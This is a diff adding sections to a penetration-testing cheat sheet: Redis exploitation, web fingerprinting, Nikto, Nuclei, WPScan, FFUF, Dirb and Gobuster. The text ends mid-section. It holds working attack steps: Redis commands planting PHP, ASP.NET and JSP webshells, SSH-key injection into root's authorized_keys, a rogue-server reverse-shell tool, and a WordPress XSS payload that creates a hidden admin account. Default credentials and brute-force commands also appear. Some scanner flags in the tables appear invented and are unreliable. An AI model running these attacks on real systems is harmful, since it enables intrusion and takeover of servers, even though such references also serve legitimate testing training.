@@ -51,6 +51,10 @@
    - [WinRM](#winrm)
    - [Redis](#redis)
 3. [Web Testing](#web-testing)
+   - [Scanners](#scanners)
+     - [Nikto](#nikto)
+     - [Nuclei](#nuclei)
+     - [WPScan](#wpscan)
    - [Directory Discovery](#directory-discovery)
      - [FFUF](#ffuf)
      - [Dirb](#dirb)
@@ -61,10 +65,6 @@
      - [Exposed Git](#exposed-git)
      - [Api](#api)
      - [IDOR](#idor)
-   - [Scanners](#scanners)
-     - [Nikto](#nikto)
-     - [Nuclei](#nuclei)
-     - [WPScan](#wpscan)
    - [Wordlists](#wordlists)
      - [Common Wordlists](#common-wordlists)
      - [Cewl](#cewl)
@@ -2507,4 +2507,790 @@ vncviewer -passwd /path/to/passwordfile <ip>:5900
 > ```
 
 ---
+
+## Redis
+
+**Common Commands**
+
+| Command      | Description        | Usage                        |
+|--------------|--------------------|------------------------------|
+| SET          | Set key value      | SET key value                |
+| GET          | Get key value      | GET key                      |
+| KEYS         | List keys          | KEYS *                       |
+| DEL          | Delete key         | DEL key                      |
+| FLUSHALL     | Delete all keys    | FLUSHALL                     |
+| CONFIG GET   | Get config         | CONFIG GET *                 |
+| CONFIG SET   | Set config         | CONFIG SET dir /tmp          |
+| SAVE         | Save to disk       | SAVE                         |
+| INFO         | Server info        | INFO                         |
+| CLIENT LIST  | List clients       | CLIENT LIST                  |
+| SLAVEOF      | Set replication    | SLAVEOF host port            |
+| MODULE LOAD  | Load module        | MODULE LOAD /path/to/module.so|
+
+**Common Credentials**
+
+| Username       | Password        |
+|----------------|-----------------|
+| admin          | admin           |
+| administrator  | administrator   |
+| root           | root            |
+| user           | user            |
+| test           | test            |
+| redis          | redis           |
+
+### Basic log in
+> ```bash
+> redis-cli -h <hostname> -p <port-number> --user <username> -a <password>
+> ```
+
+### Uploading a webshell through redis
+
+- ### Method 1: PHP webshell
+> ```bash
+> redis-cli -h target.com
+>> flushall
+>> set shell '<?php system($_REQUEST["cmd"]); ?>'
+>> config set dbfilename shell.php
+>> config set dir /var/www/html
+>> save
+> ```
+> # Access: http://target.com/shell.php?cmd=whoami
+
+- ### Method 2: ASP.NET webshell
+> ```bash
+>> set shell '<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><%Process.Start(Request["cmd"]);%>'
+>> config set dbfilename shell.aspx
+>> config set dir C:\\inetpub\\wwwroot
+>> save
+> ```
+- ### Method 3: JSP webshell
+> ```bash
+>> set shell '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>'
+>> config set dbfilename shell.jsp
+>> config set dir /var/www/html
+>> save
+> ```
+
+### Injecting SSH
+
+- ### Generate SSH key
+> ```bash
+> ssh-keygen -t rsa -f redis_key
+> ```
+- ### Prepare key with newlines
+> ```bash
+> (echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > key.txt
+> ```
+- ### Inject into authorized_keys
+> ```bash
+> redis-cli -h target.com flushall
+> cat key.txt | redis-cli -h target.com -x set ssh_key
+> redis-cli -h target.com config set dbfilename authorized_keys
+> redis-cli -h target.com config set dir /root/.ssh
+> redis-cli -h target.com save
+> ```
+# Alternative paths
+1. /home/redis/.ssh/authorized_keys
+2. /home/ubuntu/.ssh/authorized_keys
+3. /var/lib/redis/.ssh/authorized_keys
+
+- ### Connect via SSH
+> ```bash
+> ssh -i redis_key root@target.com
+> ```
+
+### Using [Redis Rogue Server](https://github.com/n0b0dyCN/redis-rogue-server)
+
+> ```bash
+> # 1. Clone the rpository
+> git clone https://github.com/n0b0dyCN/redis-rogue-server
+> # 2. Build the code
+> cd RedisModulesSDK/exp/
+> make
+> # 3. Copy the .so file to same folder with redis-rogue-server.py
+> # 4. For an interactive shell
+> ./redis-rogue-server.py --rhost <target> --lhost <attacker>
+> # 5. For reverse shell, set up a nc listener
+> ```
+
+---
+
+## Web Testing
+
+**Fingerprinting**
+
+### Web Technology Detection
+- ### Detect technologies used by the target website
+> ```bash
+> whatweb -a 3 [TARGET_IP]
+> ```
+- ### Obtain SSL certificate information
+> ```bash
+> openssl s_client -connect <target_domain>:443
+> ```
+- ### Use BuiltWith to gather detailed technology profile
+> ```bash
+> builtwith [TARGET_IP]
+> ```
+
+**Scanners**
+# Nikto
+- ### Installation
+> ```bash
+> sudo apt-get install nikto
+> ```
+- ### Standard Command to Scan Websites
+> ```bash
+> nikto –host (web url host name) –(http port number)
+> ```
+- ### Scan Options
+> ```bash
+> nikto –h (Hostname/IP address)            # Scan a host
+> nikto -h -port (Port Number1),(Port Number2)  # Scan host targeting specific ports
+> nikto -h (Hostname) -maxtime (seconds)    # Define maximum scan time
+> nikto -h-until                           # Scan duration
+> nikto -h-vhost                           # Define host header
+> nikto -h-no404                           # Skip http 404 guessing
+> nikto -h-nossl                           # Stop using SSL during scan
+> nikto -h-ssl                             # Force to use SSL
+> nikto -update                            # Update scan engine plugins
+> nikto -h-dbcheck                         # Check database
+> nikto -h (Hostname/IP address) -output (filename)  # Input output to a file
+> nikto -h-useproxy (Proxy IP address)     # Web host scan via a proxy
+> nikto -h-config (filename.conf)          # Use a specified file as a database
+> nikto -h-nolookup                        # Stop DNS lookup for hosts
+> nikto -h-nocache                         # Stop caching responses for scans
+> ```
+- ### Display Options
+> ```bash
+> nikto -h -Display (option)
+> 1    # Display redirects
+> 2    # Display cookies
+> 3    # Display 200 OK response
+> 4    # Display Web URLs requiring authentication
+> D    # Display debug output
+> E    # Show HTTP errors
+> P    # Print to STDOUT
+> V    # Verbose output display
+> ```
+- ### Output Options
+> ```bash
+> nikto -h -Format
+> csv  # Comma Separated Value
+> htm  # HTML Format
+> txt  # Plain text
+> xml  # XML Format
+> ```
+- ### Tuning Options
+> ```bash
+> nikto -h (Hostname) -tuning (Option)
+> 0    # Upload files
+> 7    # Remote File Retrieval - Server Wide
+> 1    # View specific file in log
+> 8    # Command Execution / Remote Shell
+> 2    # Default file misconfiguration
+> 9    # SQL Injection
+> 3    # Display information disclosure
+> a    # Authentication Bypass
+> 4    # Injection (XSS/Script/HTML)
+> b    # Software Identification
+> 5    # Remote File Retrieval - Inside Web Root
+> c    # Remote Source Inclusion
+> 6    # Denial of Service
+> x    # Reverse Tuning Options
+> ```
+
+# Nuclei
+
+### Common Nuclei Commands
+
+- ### Basic Usage
+> ```bash
+> nuclei -u https://example.com
+> ```
+- ### Scanning from a File
+> ```bash
+> nuclei -l targets.txt
+> ```
+- ### Using Custom Templates
+> ```bash
+> nuclei -t /path/to/templates/
+> ```
+- ### Scanning for CVEs
+> ```bash
+> nuclei -t cves/ -l targets.txt
+> ```
+
+| Command                           | Example Usage                                          | Function                                                   | Output Example                             |
+|-----------------------------------|--------------------------------------------------------|-----------------------------------------------------------|--------------------------------------------|
+| **Basic Scan**                    | ```nuclei -u https://example.com```                     | Initiates a basic scan on the specified target URL.        | Scanning https://example.com...             |
+| **Scanning from a File**          | ```nuclei -l targets.txt```                            | Scans multiple targets listed in a file.                   | Scanning targets from targets.txt...       |
+| **Using Custom Templates**        | ```nuclei -t /path/to/templates/```                    | Uses custom or additional templates from a specified directory. | Using templates from /path/to/templates/    |
+| **Scanning for CVEs**             | ```nuclei -t cves/ -l targets.txt```                   | Scans for vulnerabilities related to CVEs using CVE-specific templates. | Scanning for CVEs...                        |
+| **Outputting Results to a File**  | ```nuclei -u https://example.com -o output.txt```      | Saves scan results to a specified file for later analysis.  | Results saved to output.txt                |
+| **Verbose Output**                | ```nuclei -u https://example.com -v```                 | Provides detailed information about the scanning process.  | Verbose mode enabled.                     |
+| **Silent Mode**                   | ```nuclei -u https://example.com -silent```            | Runs the scan without displaying output on the console.    | Running scan in silent mode.              |
+| **Displaying Version**            | ```nuclei -version```                                  | Displays the current version of Nuclei installed.          | Nuclei version 2.0.0                       |
+| **Updating Nuclei**               | ```nuclei -update```                                   | Updates the Nuclei tool to the latest version available.   | Nuclei updated to the latest version.     |
+| **Help and Usage Information**    | ```nuclei -h```                                        | Displays help information and a list of available commands. | Usage: nuclei [options]                   |
+| **Specify Multiple Targets**     | ```nuclei -l targets.txt -t /path/to/templates/```     | Scans multiple targets with specified templates.           | Scanning targets from targets.txt...       |
+| **Timeout for Requests**          | ```nuclei -u https://example.com -timeout 5```         | Sets a timeout duration for requests during the scan.      | Timeout set to 5 seconds.                  |
+| **Custom User-Agent**             | ```nuclei -u https://example.com -ua "CustomUserAgent"``` | Sets a custom User-Agent string for requests.              | Using custom User-Agent: CustomUserAgent  |
+| **Output JSON Format**            | ```nuclei -u https://example.com -json```              | Outputs scan results in JSON format.                       | Results saved in JSON format.             |
+| **Resume Previous Scan**         | ```nuclei -resume session.json```                      | Resumes a previously interrupted scan using a session file. | Resuming scan from session.json...         |
+| **Health Check**                  | ```nuclei -health```                                   | Performs a diagnostic check on the Nuclei tool.            | Nuclei is functioning correctly.           |
+| **Include/Exclude Templates**     | ```nuclei -t /path/to/templates/ -exclude exclude.yaml``` | Includes or excludes specific templates during the scan.   | Excluding templates in exclude.yaml       |
+| **Use Custom DNS Resolvers**      | ```nuclei -u https://example.com -r resolvers.txt```   | Specifies custom DNS resolvers for the scan.              | Using DNS resolvers from resolvers.txt    |
+| **Rate Limiting**                 | ```nuclei -u https://example.com -rl 10```             | Limits requests sent per second during the scan.           | Rate limit set to 10 requests per second.  |
+| **Store HTTP Responses**          | ```nuclei -u https://example.com --store-requests```   | Stores HTTP requests and responses during the scan.       | HTTP requests and responses stored.       |
+| **Firewall Detection**            | ```nuclei -u https://example.com --detect-firewall```  | Detects the presence of a firewall and assesses its impact on scanning. | Detecting firewall presence...            |
+| **Finding Common Log Files**      | ```nuclei -u https://example.com --find-logs```        | Searches for common log files on the target site.          | Searching for log files...                |
+| **Finding Common Backup Files**   | ```nuclei -u https://example.com --find-backups```     | Searches for common backup files on the target site.       | Searching for backup files...             |
+| **Enumerate Users**               | ```nuclei -u https://example.com --enum-users```       | Lists registered users on the target site.                | Enumerating users...                      |
+| **Check for Vulnerabilities**     | ```nuclei -u https://example.com --check-vulns```      | Scans for known vulnerabilities in web components.         | Scanning for vulnerabilities...           |
+| **Enumerate Plugins and Extensions** | ```nuclei -u https://example.com --enum-plugins```    | Enumerates installed plugins and extensions.               | Enumerating plugins and extensions...     |
+| **Brute Force Testing**           | ```nuclei -u https://example.com --brute --wordlist wordlist.txt``` | Performs brute force attacks to test password strength.     | Brute forcing with wordlist.txt...         |
+| **Check Configuration**           | ```nuclei -u https://example.com --check-config```     | Checks for insecure configurations and misconfigurations.  | Checking configuration...                |
+
+# WPScan
+
+### Common Commands
+- ### Basic Scan
+> ```bash
+> wpscan --url http://example.com
+> ```
+- ### Enumerating Plugins
+> ```bash
+> wpscan --url http://example.com --enumerate p
+> ```
+- ### Enumerating Themes
+> ```bash
+> wpscan --url http://example.com --enumerate t
+> ```
+- ### Enumerating Users
+> ```bash
+> wpscan --url http://example.com --enumerate u
+> wpscan -u “http://<IP-ADDRESS>/” --username <username> -w /usr/share/seclist/Usernames/xato-usernames-top-1millions-20000.txt
+> ```
+- ### Brute Forcing
+> ```bash
+> wpscan --url http://<IP-ADDRESS>/wp/wp-login.php -U Admin --passwords /usr/share/wordlists/rockyou.txt --password-attack wp-login
+> ```
+
+| Command                         | Example Usage                                              | Function                                                       | Output Example                            |
+|---------------------------------|------------------------------------------------------------|---------------------------------------------------------------|-------------------------------------------|
+| **Basic Usage**                 | ```wpscan --url https://example.com```                      | Initiates a basic scan of the specified WordPress site.        | Crawling https://example.com...            |
+| **Display Help**                | ```wpscan --help```                                         | Displays help information and available commands.              | Usage: wpscan [options]                   |
+| **Display Version**             | ```wpscan --version```                                      | Displays the current version of WPScan installed.              | WPScan version 3.8.0                      |
+| **Update WPScan**               | ```wpscan --update```                                       | Updates the WPScan tool to the latest version.                 | WPScan updated to the latest version.    |
+| **Using an API Token**          | ```wpscan --url https://example.com --api-token YOUR_API_TOKEN``` | Allows enhanced features with an API token.                    | Using API token for enhanced data...     |
+| **Enumerate All Available Options** | ```wpscan --url https://example.com --enumerate ap,at,au``` | Enumerates all available options, including plugins, themes, and users. | Enumerating all available options...      |
+| **Enumerate Plugins**           | ```wpscan --url https://example.com --enumerate p```        | Enumerates installed plugins on the target site.               | Enumerating plugins...                   |
+| **Enumerate Themes**            | ```wpscan --url https://example.com --enumerate t```        | Enumerates installed themes on the target site.                | Enumerating themes...                    |
+| **Enumerate Users**             | ```wpscan --url https://example.com --enumerate u```        | Enumerates users registered on the target WordPress site.      | Enumerating users...                     |
+| **Check for Vulnerabilities**   | ```wpscan --url https://example.com --plugins-detection mixed``` | Checks for known vulnerabilities in detected plugins.           | Scanning for vulnerabilities...          |
+| **Check for Specific Vulnerabilities** | ```wpscan --url https://example.com --vulnerable``` | Checks for specific vulnerabilities listed in the database.    | Checking for known vulnerabilities...     |
+| **Brute Force Enumeration**     | ```wpscan --url https://example.com --brute --wordlist wordlist.txt``` | Uses brute force to discover usernames or passwords.           | Brute forcing usernames...               |
+| **Use Proxy**                   | ```wpscan --url https://example.com --proxy http://proxy.example.com``` | Uses a specified proxy for requests.                          | Using proxy: http://proxy.example.com     |
+| **Custom User-Agent**           | ```wpscan --url https://example.com --user-agent "CustomUserAgent"``` | Sets a custom User-Agent string for requests.                  | Using custom User-Agent: CustomUserAgent |
+| **Rate Limiting**               | ```wpscan --url https://example.com --rate-limit 5```       | Limits the number of requests sent per second.                 | Rate limit set to 5 requests per second. |
+| **Output Results to a File**    | ```wpscan --url https://example.com -o output.txt```        | Outputs the scan results to a specified file.                  | Results saved to output.txt              |
+| **Output JSON**                 | ```wpscan --url https://example.com --output-json```        | Outputs results in JSON format.                                | Results saved in JSON format.            |
+| **Store HTTP Responses**        | ```wpscan --url https://example.com --store-requests```     | Stores HTTP requests and responses during the scan.            | HTTP requests and responses stored.      |
+| **Verbose Mode**                | ```wpscan --url https://example.com --verbose```            | Enables verbose output for detailed information.              | Verbose mode enabled.                    |
+| **Resume Scan**                 | ```wpscan --url https://example.com --resume resume.cfg```  | Resumes a scan using a previous session configuration file.    | Resuming scan from resume.cfg...         |
+| **Exclude Specific Paths**      | ```wpscan --url https://example.com --exclude-path /wp-admin``` | Excludes specified paths from the scan.                        | Excluding path: /wp-admin                |
+
+- ### Gather WordPress Nonce: to attack with a HttpOnly cookie on WordPress: We need to create a Js function that fetches the nonce which is a server generated token to prevent CSRF attacks
+> ```javascript
+> var request = new XMLHttpRequest();
+> var targetURL = "/wp-admin/user-new.php";
+> var regex = /name="([^"]*?)"/g;
+> request.open("GET", targetURL, false);
+> request.send();
+> var match = regex.exec(request.responseText);
+> var nonce = match[1];
+> ```
+- ### Create New WordPress Admin Account
+> ```javascript
+> var params = "action=createuser&_wpnonce_create-user=" + nonce + "&user_login=newadmin&email=newadmin@example.com&pass1=newpassword&pass2=newpassword&role=administrator";
+> var request = new XMLHttpRequest();
+> request.open("POST", targetURL, true);
+> request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+> request.send(params);
+> ```
+- ### Compress the JavaScript Code: use the tool JSCompress  -  https://jscompress.com/
+> ```javascript
+> var params = "action=createuser&_wpnonce_create-user=" + nonce + "&user_login=newadmin&email=newadmin@example.com&pass1=newpassword&pass2=newpassword&role=administrator";
+> var request = new XMLHttpRequest();
+> request.open("POST", targetURL, true);
+> request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+> request.send(params);
+> ```
+- ### Encode the JavaScript Payload: use the following JS function.
+> ```javascript
+> function toJavaScriptEncoding(str) {
+>     var result = '';
+>     for (var i = 0; i < str.length; i++) {
+>         result += str.charCodeAt(i);
+>         if (i !== str.length - 1) {
+>             result += ",";
+>         }
+>     }
+>     return result;
+> }
+> 
+> let encodedPayload = toJavaScriptEncoding('insert_minified_javascript');
+> console.log(encodedPayload);
+> ```
+- ### Request and Execute the Payload: the function eval is responsible for interpreting the string as code and execute it.
+> ```bash
+> curl -i http://example.com --user-agent "<script>eval(String.fromCharCode(<resultFromRunningAboveScritpToEncode>))</script>" --proxy 127.0.0.1:8080
+> ```
+
+**Directory Discovery**
+
+# FFUF
+
+| Command                            | Example Usage                                                | Function                                                        | Output Example                             |
+|------------------------------------|--------------------------------------------------------------|----------------------------------------------------------------|--------------------------------------------|
+| **URL to Fuzz**                    | ```ffuf -u http://target.com/FUZZ```                          | Specifies the target URL with FUZZ as a placeholder.           | Target: http://target.com/admin            |
+| **Wordlist**                       | ```ffuf -w /path/to/wordlist.txt```                           | Specifies the wordlist to use for fuzzing.                     | Using wordlist: /path/to/wordlist.txt      |
+| **Use Multiple Wordlists**         | ```ffuf -w /path/to/wordlist1.txt:/path/to/wordlist2.txt```   | Allows multiple wordlists for fuzzing.                         | Found: /login/                             |
+| **HTTP Method**                    | ```ffuf -X POST```                                           | Specifies the HTTP method for fuzzing.                         | POST /api/login                            |
+| **Custom HTTP Headers**            | ```ffuf -H "Authorization: Bearer token"```                  | Sets custom HTTP headers for the request.                      | Authorization header sent                 |
+| **Custom User-Agent**              | ```ffuf -H "User-Agent: CustomAgent"```                       | Specifies a custom User-Agent header.                          | User-Agent: CustomAgent                    |
+| **Use Proxy**                      | ```ffuf -x http://proxy:8080```                              | Sends requests through a specified proxy.                      | Proxy: http://proxy:8080                   |
+| **Follow Redirects**               | ```ffuf -r```                                                | Follows HTTP redirects during fuzzing.                         | Following redirects                        |
+| **Set Delay Between Requests**     | ```ffuf -d 2```                                              | Sets a delay in seconds between each request.                  | Request delay: 2 seconds                   |
+| **Limit Concurrent Requests**      | ```ffuf -p 10```                                             | Limits the number of concurrent requests.                      | 10 concurrent requests in progress        |
+| **Timeout**                         | ```ffuf -t 60```                                             | Sets the request timeout in seconds.                           | Timeout set to 60 seconds                  |
+| **Match HTTP Status Codes**        | ```ffuf -mc 200```                                           | Filters results to show only specific HTTP status codes.       | 200: /home/                                |
+| **Filter HTTP Status Codes**       | ```ffuf -fc 404```                                           | Filters out results with specific HTTP status codes.           | 200: /secret.php                          |
+| **Filter by Content Size**         | ```ffuf -fs 4242```                                          | Filters results based on content size.                         | Filtered: 4242 bytes                       |
+| **Filter by Line Count**           | ```ffuf -fl 42```                                            | Filters results based on the number of lines.                  | Filtered: 42 lines                         |
+| **Filter by Word Count**           | ```ffuf -fw 1337```                                          | Filters results based on the number of words.                  | Filtered: 1337 words                       |
+| **Filter by Regex**                | ```ffuf -fr "regex"```                                       | Filters results based on a regex pattern.                      | Filtered: regex match                      |
+| **Auto-calibration**               | ```ffuf -ac```                                               | Automatically calibrates filters based on baseline requests.   | Auto-calibration complete                  |
+| **Auto-calibration Strategy**      | ```ffuf -acs mode```                                         | Sets the auto-calibration strategy (e.g., basic, advanced).    | Auto-calibration strategy: basic           |
+| **Enable Recursive Mode**          | ```ffuf -recursion```                                        | Enables recursive scanning within discovered directories.      | Discovered: /admin/login/                  |
+| **Recursion Depth**                | ```ffuf -recursion-depth 2```                                | Sets the maximum recursion depth.                              | Recursion depth set to 2                   |
+| **Stop on First Match**            | ```ffuf -sf```                                               | Stops the fuzzing process after the first match is found.      | Stopped after first match: /admin         |
+| **Stop on Spelling Error**         | ```ffuf -ss```                                               | Stops fuzzing on spelling errors.                              | Stopped on spelling error                  |
+| **Ignore Wordlist Comments**       | ```ffuf -ignore-wordlist-comments```                         | Ignores lines starting with `#` in the wordlist.               | Comments ignored in wordlist               |
+| **Verbose Mode**                   | ```ffuf -v```                                                | Enables verbose output during fuzzing.                         | Request: /FUZZ sent, response: 200        |
+| **Quiet Mode**                     | ```ffuf -s```                                                | Suppresses the banner and only prints results.                | Quiet mode enabled                        |
+| **Color Output**                   | ```ffuf -c```                                                | Enables colorized output in the terminal.                     | Colorized output                          |
+| **Show All Status Codes**          | ```ffuf -ac-all```                                           | Displays all HTTP status codes, including non-200 responses.  | Displayed all HTTP status codes           |
+| **Output to File**                 | ```ffuf -o output.json```                                    | Outputs results to a specified file.                           | Results saved to output.json              |
+| **Output Format**                  | ```ffuf -of json```                                          | Specifies the output format (e.g., json, ejson, html, md, csv). | Output format: json                       |
+| **Input from File**                | ```ffuf -input-cmd "cat input.txt"```                        | Reads input from a file instead of standard input.             | Input read from file                       |
+
+### Examples of usage
+- ###Basic Subdomain fuzzing
+> ```bash
+> ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/combined_subdomains.txt -u http://<IP-ADDRESS -H "Host: FUZZ.<IP-ADDRESS>" -t 200 -ic -fw 18
+>
+- ###Filter to show only 200 or 3xx responses
+> ```bash
+> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -mc 200,300-399
+> ```
+- ### Output results to a file
+> ```bash
+> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -o results.txt
+> ```
+- ### Recursive directory fuzzing
+> ```
+> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -recursion
+> ```
+- ### Set number of threads
+> ```bash
+> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -t 50
+> ```
+- ### Use proxy
+> ```bash
+> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -x http://127.0.0.1:8080
+> ```
+- ### Use a delay between requests
+> ```bash
+> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -p 0.1-0.5
+> ```
+- ### Set request timeout
+> ```bash
+> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -timeout 10
+> ```
+- ### Match response size
+> ```bash
+> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -fs 4242
+> ```
+- ###Basic file fuzzing
+> ```bash
+> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ
+> ```
+- ### Filter to show only 200 or 3xx responses
+> ```bash
+> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -mc 200,300-399
+> ```
+- ### Specify extensions
+> ```bash
+> ffuf -w /path/to/wordlist.txt:FUZZ -u http://target/FUZZ.html,http://target/FUZZ.php -mc 200,300-399
+> ```
+- ### Output results to a file
+> ```bash
+> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -o results.txt
+> ```
+- ### Set number of threads
+> ```bash
+> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -t 50
+> ```
+- ### Use proxy
+> ```bash
+> ffuf -w /path/to/wordlist.txt -u http://target/FUZZ -x http://127.0.0.1:8080
+> ```
+- LFI Fuzzing
+- ### Normal Fuzzing
+> ```bash
+> ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
+> ```
+- ### Fuzz GET parameters
+> ```bash
+> ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
+> ```
+- ### Fuzz PHP files
+> ```bash
+> ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
+> ```
+- ### Fuzz Webroot: to fuzz for index.php use wordlist for Linux or wordlist for windows, or this general wordlist alternative; consider that depending on our LFI situation, we may need to add a few back directories (e.g. ../../../../), and then add our index.php afterwords.
+> ```bash
+> ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
+> ```
+- ### Fuzz Server Logs and Configs: we can use the same wordlists as before
+> ```bash
+> ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
+> ```
+- ### For Subdomain Discovery
+> ```bash
+> ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/combined_subdomains.txt -u http://<IP Address> -H "Host: FUZZ.<IP Address>" -t 200 -ic -fw 18
+> ```
+
+# Dirb
+
+- ### Basic directory scanning
+> ```bash
+> dirb http://target /path/to/wordlist.txt
+> ```
+- ### Save output to a file
+> ```bash
+> dirb http://target /path/to/wordlist.txt -o results.txt
+> ```
+- ### Use custom user-agent
+> ```bash
+> dirb http://target /path/to/wordlist.txt -a "Mozilla/5.0"
+> ```
+- ### Ignore non-existent pages
+> ```bash
+> dirb http://target /path/to/wordlist.txt -N
+> ```
+- ### Scan SSL (HTTPS)
+> ```bash
+> dirb https://target /path/to/wordlist.txt
+> ```
+- ### Recursively scan directories
+> ```bash
+> dirb http://target /path/to/wordlist.txt -r
+> ```
+- ### Exclude specific status codes
+> ```bash
+> dirb http://target /path/to/wordlist.txt -n -X .php,.html,.txt
+> ```
+- ### Example usage
+> ```bash
+> dirb http://target.com
+> ```
+- ### Basic file scanning with default extensions
+> ```bash
+> dirb http://target /path/to/wordlist.txt -X .php,.html,.txt
+> ```
+> ### Save output to a file
+> ```bash
+> dirb http://target /path/to/wordlist.txt -X .php,.html,.txt -o results.txt
+> ```
+- ### Use custom user-agent
+> ```bash
+> dirb http://target /path/to/wordlist.txt -X .php,.html,.txt -a "Mozilla/5.0"
+> ```
+- ### Ignore non-existent pages
+> ```bash
+> dirb http://target /path/to/wordlist.txt -X .php,.html,.txt -N
+> ```
+- ### Scan SSL (HTTPS)
+> ```bash
+> dirb https://target /path/to/wordlist.txt -X .php,.html,.txt
+> ```
+
+# Gobuster
+
+| Command                         | Example Usage                                                  | Function                                                     | Output Example                             |
+|---------------------------------|----------------------------------------------------------------|-------------------------------------------------------------|--------------------------------------------|
+| **Directory Enumeration**       | ```gobuster dir -u http://example.com -w wordlist.txt```        | Performs basic directory enumeration.                        | http://example.com/admin (Status: 200) [Size: 1234] |
+| **Specify File Extensions**     | ```gobuster dir -u http://example.com -w wordlist.txt -x php,html``` | Searches for files with specific extensions.                 | http://example.com/index.php (Status: 200) |
+| **Custom Status Codes**         | ```gobuster dir -u http://example.com -w wordlist.txt -s 200,301``` | Filters results by HTTP status codes.                        | http://example.com/backup (Status: 301)   |
+| **DNS Subdomain Enumeration**   | ```gobuster dns -d example.com -w subdomains.txt```            | Discovers subdomains via DNS enumeration.                    | Found: admin.example.com                   |
+| **Virtual Host Discovery**      | ```gobuster vhost -u http://example.com -w vhosts.txt```       | Enumerates virtual hosts on the server.                      | Found: dev.example.com (Status: 200)       |
+| **S3 Bucket Enumeration**       | ```gobuster s3 -w bucket-names.txt```                          | Searches for accessible S3 buckets.                          | http://example-bucket.s3.amazonaws.com (Status: 200) |
+| **Add Custom Headers**          | ```gobuster dir -u http://example.com -w wordlist.txt -H "X-Custom: value"``` | Adds custom HTTP headers to requests.                         | Using custom header: X-Custom              |
+| **Use Proxy**                   | ```gobuster dir -u http://example.com -w wordlist.txt --proxy http://127.0.0.1:8080``` | Routes requests through a proxy.                             | Using proxy: http://127.0.0.1:8080         |
+| **Recursive Scanning**          | ```gobuster dir -u http://example.com -w wordlist.txt -r```    | Enables recursive directory scanning.                        | http://example.com/admin/users (Status: 200) |
+| **Wildcard Detection**          | ```gobuster dir -u http://example.com -w wordlist.txt --wildcard``` | Detects and handles wildcard responses.                       | Wildcard response detected: disabling wildcards |
+| **Follow Redirects**            | ```gobuster dir -u http://example.com -w wordlist.txt -r```    | Follows HTTP redirects automatically.                        | http://example.com/old → http://example.com/new |
+| **Set Threads**                 | ```gobuster dir -u http://example.com -w wordlist.txt -t 50``` | Sets the number of concurrent threads.                       | Using 50 threads                          |
+| **Set Timeout**                 | ```gobuster dir -u http://example.com -w wordlist.txt --timeout 10s``` | Sets request timeout duration.                               | Timeout set to 10 seconds                  |
+| **Exclude Length**              | ```gobuster dir -u http://example.com -w wordlist.txt --exclude-length 1234``` | Excludes responses with specific length.                     | Excluding responses of length 1234        |
+| **Pattern Matching**            | ```gobuster dir -u http://example.com -w wordlist.txt -p pattern.txt``` | Uses pattern file for enumeration.                           | Using pattern file: pattern.txt           |
+| **No Status Codes**             | ```gobuster dir -u http://example.com -w wordlist.txt -n```    | Disables status code display.                                | http://example.com/admin                  |
+| **No Progress Bar**             | ```gobuster dir -u http://example.com -w wordlist.txt -q```    | Disables progress bar output.                                | http://example.com/admin (Status: 200)    |
+| **Verbose Output**              | ```gobuster dir -u http://example.com -w wordlist.txt -v```    | Enables verbose output mode.                                 | [+] Mode: dir<br>[+] Url: http://example.com |
+| **Output to File**              | ```gobuster dir -u http://example.com -w wordlist.txt -o output.txt``` | Saves results to a file.                                     | Results saved to output.txt               |
+| **Username Enumeration**        | ```gobuster dir -u http://example.com -w wordlist.txt -U username -P password``` | Provides credentials for authentication.                     | Using basic authentication: username      |
+| **User-Agent String**           | ```gobuster dir -u http://example.com -w wordlist.txt -a "Mozilla/5.0"``` | Sets custom User-Agent header.                                | Using User-Agent: Mozilla/5.0             |
+| **Cookies**                     | ```gobuster dir -u http://example.com -w wordlist.txt -c "session=abc123"``` | Adds cookies to requests.                                     | Using cookies: session=abc123            |
+| **No TLS Verification**         | ```gobuster dir -u https://example.com -w wordlist.txt -k```  | Skips TLS certificate verification.                           | Skipping TLS verification                 |
+| **DNS Resolver**                | ```gobuster dns -d example.com -w wordlist.txt -r 8.8.8.8```  | Uses custom DNS resolver.                                     | Using DNS resolver: 8.8.8.8               |
+| **Show IPs**                     | ```gobuster dns -d example.com -w wordlist.txt -i```         | Displays IP addresses in DNS mode.                            | admin.example.com [192.168.1.1]          |
+| **Show CNAMEs**                 | ```gobuster dns -d example.com -w wordlist.txt --show-cname``` | Displays CNAME records in DNS mode.                           | www.example.com → cdn.example.com        |
+
+### Examples
+
+- ### Filter to show only 200 responses
+> ```bash
+> gobuster dir -u http://<IP-ADDRESS> -w /path/to/wordlist.txt -s 200
+> ```
+- ### Specify extensions
+> ```bash
+> gobuster dir -u http://<IP-ADDRESS> -w /path/to/wordlist.txt -x php,html,txt
+> ```
+- ### Save output to a file
+> ```bash
